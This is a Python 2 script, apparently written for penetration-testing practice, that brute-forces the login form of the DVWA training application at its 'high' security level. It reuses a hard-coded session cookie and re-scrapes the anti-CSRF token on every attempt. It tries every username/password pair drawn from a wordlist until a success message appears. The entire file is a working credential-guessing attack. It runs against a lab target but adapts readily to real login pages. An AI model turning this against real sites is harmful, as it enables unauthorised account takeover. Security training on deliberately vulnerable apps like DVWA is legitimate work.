#!/usr/local/Cellar/python/2.7.11/Frameworks/Python.framework/Versions/2.7/bin/python2.7
from sys import argv
import requests
from bs4 import BeautifulSoup as BS

# Set up params
script, word_list, message = argv
token_field = 'user_token'
bs_parser = 'html.parser'
login_link = 'http://pentest.wp/dvwa/vulnerabilities/brute/index.php'
session = 'nn0livuju511ajakdc5aadkr00'
cookie = {'security': 'high', 'PHPSESSID': session}

# Find token of page
def find_token(content):
    bs_content = BS(content, bs_parser);
    return bs_content.findAll(attrs={"name": token_field})[0].get('value')

# Check login is successful
def check_login(content):
    bs_content = BS(content,bs_parser);
    return bs_content.body.findAll(text=message)

# Get content
request = requests.Session()
def get_content(link,params = {}):
    login_page = request.get(link, cookies=cookie,params = params)
    return login_page.text

# Loop over word list
with open(word_list) as f:
    words = f.readlines()
words = [x.strip() for x in words]

users = words
passwords = words

# Make request
content = get_content(login_link)
token = find_token(content)
pass_found = False
for user in users:
    if not pass_found:
        for password in passwords:
            params = {'username': user, 'password': password, 'Login': 'Login', 'user_token': token}
            print "sending account " + user + "/" + password + " with token " + token
            content = get_content(login_link,params)
            if not check_login(content):
                token = find_token(content)
            else:
                print '=======>>>Account is found <<<=======: ' + user + '/' + password
                pass_found = True
                break
if not pass_found:
    print 'Good luck next time!'


